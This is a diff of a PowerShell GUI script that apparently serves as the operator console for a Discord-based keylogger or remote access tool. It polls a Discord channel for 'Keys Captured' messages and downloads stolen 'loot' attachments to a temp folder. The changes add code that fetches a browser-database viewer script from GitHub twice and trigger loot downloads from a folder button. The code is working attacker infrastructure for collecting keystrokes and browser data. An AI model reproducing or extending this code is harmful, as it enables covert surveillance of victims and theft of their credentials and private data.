@@ -400,6 +400,7 @@ function DisplayNewMSG{
         $sortedNewMessages = $newMessages | Sort-Object -Property timestamp
         foreach ($message in $sortedNewMessages) {
             $messageContent = $message.content -replace "``" ,""
+            $messageContent = $messageContent -replace ":[a-zA-Z_]+:", ""
             if ($messageContent -like ":mag_right: `Keys Captured :*") {
                 $messageContent = $messageContent -replace "^:mag_right: `Keys Captured :", ""
                 Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box
@@ -424,7 +425,10 @@ function get-lootfiles {
     $wc.Headers.Add("Authorization", $headers.Authorization)
     $messages1 = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
     $messages1 = $messages1 | ConvertFrom-Json
-
+    
+    $viewer = 'https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Information%20Enumeration/Browser-DB-File-Viewer.ps1'
+    $viewPath = Join-Path -Path $lootPath -ChildPath 'DB-View.ps1'
+    $wc.DownloadFile($viewer, $viewPath)
     foreach ($message in $messages1) {
 
         foreach ($attachment in $message.attachments) {
@@ -433,16 +437,18 @@ function get-lootfiles {
 
             $filePath = Join-Path -Path $lootPath -ChildPath $filename
 
-            if (-not (Test-Path $filePath)) {
+            if (!(Test-Path $filePath)) {
                 $wc.DownloadFile($imageUrl, $filePath)
             }
+            
         }
     }
 }
 
 $lootfolder = "$env:temp\loot"
 New-Item -Path $lootfolder -ItemType Directory -Force
-get-lootfiles -ID $ID5 -lootPath $lootfolder 
+get-lootfiles -ID $ID5 -lootPath $lootfolder
+iwr -Uri https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Information%20Enumeration/Browser-DB-File-Viewer.ps1
 
 # ============================ LOOP SETUP =============================
 
@@ -631,6 +637,7 @@ $folderButton.Add_Click({
 $lootfolder = "$env:temp\loot"
 explorer.exe $lootfolder
 Add-OutputBoxLine -Outfeed "Opening Loot Folder" -OutputBoxName "OutputBox3" -ForeColor "Green"
+get-lootfiles -ID $ID5 -lootPath $lootfolder
 })
 
 # ============================ START GUI =============================
